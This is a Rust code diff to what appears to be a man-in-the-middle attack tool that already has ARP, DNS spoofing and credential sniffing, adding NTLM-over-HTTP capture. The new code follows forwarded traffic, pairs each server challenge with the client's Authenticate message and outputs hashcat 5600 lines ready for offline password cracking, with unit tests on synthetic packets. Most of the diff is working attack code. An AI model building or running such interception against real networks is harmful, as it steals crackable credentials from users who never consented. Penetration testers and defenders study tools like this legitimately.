@@ -4,18 +4,25 @@ use anyhow::Result;
 use pnet_packet::ethernet::{EtherTypes, EthernetPacket};
 use pnet_packet::ipv4::Ipv4Packet;
 use pnet_packet::Packet;
+use std::collections::HashMap;
 use std::net::Ipv4Addr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
 
 use crate::attacks::dns_spoof;
+use crate::attacks::ntlmssp;
 use crate::net::arp;
 use crate::net::iface::IfaceInfo;
 
 pub type SharedTargets = Arc<Mutex<Vec<(Ipv4Addr, [u8; 6])>>>;
 
 pub type SharedDnsRules = Arc<Mutex<Vec<(String, Ipv4Addr)>>>;
+
+// canonicalized 4-tuple identifying an ntlm auth exchange (symmetric across
+// challenge/response directions). value is the server's 8-byte challenge.
+pub type NtlmFlowKey = (Ipv4Addr, u16, Ipv4Addr, u16);
+pub type SharedNtlmFlows = Arc<Mutex<HashMap<NtlmFlowKey, [u8; 8]>>>;
 
 // "the tao that can be told is not the eternal tao." — tao te ching, 1
 
@@ -38,6 +45,7 @@ pub struct ForwardConfig {
     pub dns_spoofs: SharedDnsRules,
     pub sniff_creds: bool,
     pub capture: bool,
+    pub ntlm_flows: SharedNtlmFlows,
 }
 
 // receive, inspect, forward
@@ -115,6 +123,9 @@ pub fn forwarding_loop(
         // creds
         if config.sniff_creds {
             if let Some(cred) = sniff_credentials(&ipv4) {
+                let _ = event_tx.send(cred);
+            }
+            if let Some(cred) = sniff_ntlm_http(&ipv4, &config.ntlm_flows) {
                 let _ = event_tx.send(cred);
             }
         }
@@ -377,6 +388,105 @@ fn sniff_credentials(ipv4: &Ipv4Packet) -> Option<ForwardEvent> {
     None
 }
 
+// canonical 4-tuple: smaller (ip, port) always first so challenge+response
+// on the same tcp connection hash to the same slot.
+fn flow_key(
+    src_ip: Ipv4Addr,
+    src_port: u16,
+    dst_ip: Ipv4Addr,
+    dst_port: u16,
+) -> NtlmFlowKey {
+    if (src_ip, src_port) < (dst_ip, dst_port) {
+        (src_ip, src_port, dst_ip, dst_port)
+    } else {
+        (dst_ip, dst_port, src_ip, src_port)
+    }
+}
+
+fn is_http_port(p: u16) -> bool {
+    matches!(p, 80 | 8080)
+}
+
+// locate an NTLM auth header line; return (base64_blob, is_server_challenge).
+// http headers are ascii so byte-slicing at fixed lengths is safe here.
+fn extract_ntlm_header(text: &str) -> Option<(&str, bool)> {
+    const AUTH: &str = "Authorization: NTLM ";
+    const WWW: &str = "WWW-Authenticate: NTLM ";
+    for line in text.lines() {
+        if let Some(head) = line.get(..AUTH.len()) {
+            if head.eq_ignore_ascii_case(AUTH) {
+                return Some((line[AUTH.len()..].trim(), false));
+            }
+        }
+        if let Some(head) = line.get(..WWW.len()) {
+            if head.eq_ignore_ascii_case(WWW) {
+                return Some((line[WWW.len()..].trim(), true));
+            }
+        }
+    }
+    None
+}
+
+// inspect an http/tcp packet for ntlmssp; update per-flow state; emit a
+// credential event when we pair a challenge with an authenticate.
+fn sniff_ntlm_http(ipv4: &Ipv4Packet, flows: &SharedNtlmFlows) -> Option<ForwardEvent> {
+    if ipv4.get_next_level_protocol().0 != 6 {
+        return None; // tcp only
+    }
+    let payload = ipv4.payload();
+    if payload.len() < 20 {
+        return None;
+    }
+    let data_offset = ((payload[12] >> 4) as usize) * 4;
+    if data_offset >= payload.len() {
+        return None;
+    }
+    let tcp_payload = &payload[data_offset..];
+    if tcp_payload.is_empty() {
+        return None;
+    }
+
+    let src_port = u16::from_be_bytes([payload[0], payload[1]]);
+    let dst_port = u16::from_be_bytes([payload[2], payload[3]]);
+    if !is_http_port(src_port) && !is_http_port(dst_port) {
+        return None;
+    }
+
+    let text = String::from_utf8_lossy(tcp_payload);
+    let (blob, _is_challenge_header) = extract_ntlm_header(&text)?;
+    let decoded = ntlmssp::base64_decode(blob)?;
+    let (off, msg_type) = ntlmssp::find_message(&decoded)?;
+    let msg = &decoded[off..];
+
+    let key = flow_key(ipv4.get_source(), src_port, ipv4.get_destination(), dst_port);
+
+    match msg_type {
+        ntlmssp::NtlmMessageType::Challenge => {
+            if let Some(ch) = ntlmssp::parse_challenge(msg) {
+                if let Ok(mut map) = flows.lock() {
+                    map.insert(key, ch);
+                }
+            }
+            None
+        }
+        ntlmssp::NtlmMessageType::Authenticate => {
+            let auth = ntlmssp::parse_authenticate(msg)?;
+            let challenge = flows.lock().ok()?.remove(&key)?;
+            let line = ntlmssp::format_hashcat_5600(
+                &auth.username,
+                &auth.domain,
+                &challenge,
+                &auth.nt_response,
+            )?;
+            Some(ForwardEvent::Credential {
+                proto: "ntlm-v2-http".into(),
+                detail: line,
+            })
+        }
+        ntlmssp::NtlmMessageType::Negotiate => None,
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -537,6 +647,139 @@ mod tests {
         assert_eq!(u16::from_be_bytes([frame[36], frame[37]]), 12345);
         assert_eq!(u16::from_be_bytes([frame[38], frame[39]]), 12);
         assert_eq!(&frame[42..], &dns_payload);
+    }
+
+    // build a minimal ipv4+tcp packet with controllable src/dst ports and ips
+    fn make_tcp_ipv4_full(
+        src_ip: Ipv4Addr,
+        dst_ip: Ipv4Addr,
+        src_port: u16,
+        dst_port: u16,
+        payload: &[u8],
+    ) -> Vec<u8> {
+        let total_len = 20 + 20 + payload.len();
+        let mut buf = vec![0u8; total_len];
+        buf[0] = 0x45;
+        let len = total_len as u16;
+        buf[2] = (len >> 8) as u8;
+        buf[3] = len as u8;
+        buf[9] = 6; // tcp
+        buf[12..16].copy_from_slice(&src_ip.octets());
+        buf[16..20].copy_from_slice(&dst_ip.octets());
+        let tcp = &mut buf[20..40];
+        tcp[0] = (src_port >> 8) as u8;
+        tcp[1] = src_port as u8;
+        tcp[2] = (dst_port >> 8) as u8;
+        tcp[3] = dst_port as u8;
+        tcp[12] = 0x50; // data offset = 20 bytes
+        buf[40..].copy_from_slice(payload);
+        buf
+    }
+
+    #[test]
+    fn test_sniff_ntlm_http_challenge_alone_does_not_emit() {
+        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
+        let ch_msg = ntlmssp::build_challenge_msg_for_tests([0xab; 8]);
+        let body = format!(
+            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\n\r\n",
+            ntlmssp::base64_encode(&ch_msg)
+        );
+        let server = Ipv4Addr::new(10, 0, 0, 10);
+        let client = Ipv4Addr::new(10, 0, 0, 20);
+        let raw = make_tcp_ipv4_full(server, client, 80, 40000, body.as_bytes());
+        let ipv4 = Ipv4Packet::new(&raw).unwrap();
+
+        assert!(sniff_ntlm_http(&ipv4, &flows).is_none());
+        assert_eq!(flows.lock().unwrap().len(), 1);
+    }
+
+    #[test]
+    fn test_sniff_ntlm_http_full_pairing_emits_credential() {
+        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
+        let server = Ipv4Addr::new(10, 0, 0, 10);
+        let client = Ipv4Addr::new(10, 0, 0, 20);
+        let client_port = 40000u16;
+
+        // 1) server → client CHALLENGE
+        let challenge = [0xaa, 0xbb, 0xcc, 0xdd, 0x11, 0x22, 0x33, 0x44];
+        let ch_msg = ntlmssp::build_challenge_msg_for_tests(challenge);
+        let ch_body = format!(
+            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\n\r\n",
+            ntlmssp::base64_encode(&ch_msg)
+        );
+        let raw1 = make_tcp_ipv4_full(server, client, 80, client_port, ch_body.as_bytes());
+        let pkt1 = Ipv4Packet::new(&raw1).unwrap();
+        assert!(sniff_ntlm_http(&pkt1, &flows).is_none());
+
+        // 2) client → server AUTHENTICATE
+        let mut nt_response = vec![0u8; 16]; // NTproofStr
+        nt_response[0..16].copy_from_slice(&[0x77; 16]);
+        nt_response.extend_from_slice(&[0x88; 40]); // blob
+        let auth_msg =
+            ntlmssp::build_authenticate_msg_for_tests("CORP", "alice", &nt_response);
+        let auth_body = format!(
+            "GET / HTTP/1.1\r\nAuthorization: NTLM {}\r\n\r\n",
+            ntlmssp::base64_encode(&auth_msg)
+        );
+        let raw2 = make_tcp_ipv4_full(client, server, client_port, 80, auth_body.as_bytes());
+        let pkt2 = Ipv4Packet::new(&raw2).unwrap();
+
+        let ev = sniff_ntlm_http(&pkt2, &flows).expect("pairing should emit a credential");
+        match ev {
+            ForwardEvent::Credential { proto, detail } => {
+                assert_eq!(proto, "ntlm-v2-http");
+                assert!(detail.starts_with("alice::CORP:aabbccdd11223344:"));
+                // NTproofStr (16 bytes of 0x77) = 32 × '7'
+                assert!(detail.contains("77777777777777777777777777777777"));
+            }
+            _ => panic!("expected Credential"),
+        }
+
+        // flow state consumed on pairing
+        assert!(flows.lock().unwrap().is_empty());
+    }
+
+    #[test]
+    fn test_sniff_ntlm_http_orphan_authenticate_yields_nothing() {
+        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
+        let mut nt = vec![0u8; 16];
+        nt.extend_from_slice(&[0u8; 32]);
+        let auth_msg = ntlmssp::build_authenticate_msg_for_tests("D", "U", &nt);
+        let body = format!(
+            "GET / HTTP/1.1\r\nAuthorization: NTLM {}\r\n\r\n",
+            ntlmssp::base64_encode(&auth_msg)
+        );
+        let raw = make_tcp_ipv4_full(
+            Ipv4Addr::new(10, 0, 0, 20),
+            Ipv4Addr::new(10, 0, 0, 10),
+            40000,
+            80,
+            body.as_bytes(),
+        );
+        let pkt = Ipv4Packet::new(&raw).unwrap();
+        // no stored challenge for this flow → no credential emitted
+        assert!(sniff_ntlm_http(&pkt, &flows).is_none());
+    }
+
+    #[test]
+    fn test_sniff_ntlm_http_ignores_non_http_ports() {
+        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
+        let ch_msg = ntlmssp::build_challenge_msg_for_tests([0; 8]);
+        let body = format!(
+            "something: NTLM {}\r\n",
+            ntlmssp::base64_encode(&ch_msg)
+        );
+        // port 22 instead of 80
+        let raw = make_tcp_ipv4_full(
+            Ipv4Addr::new(10, 0, 0, 1),
+            Ipv4Addr::new(10, 0, 0, 2),
+            22,
+            40000,
+            body.as_bytes(),
+        );
+        let pkt = Ipv4Packet::new(&raw).unwrap();
+        assert!(sniff_ntlm_http(&pkt, &flows).is_none());
+        assert_eq!(flows.lock().unwrap().len(), 0);
     }
 
     #[test]
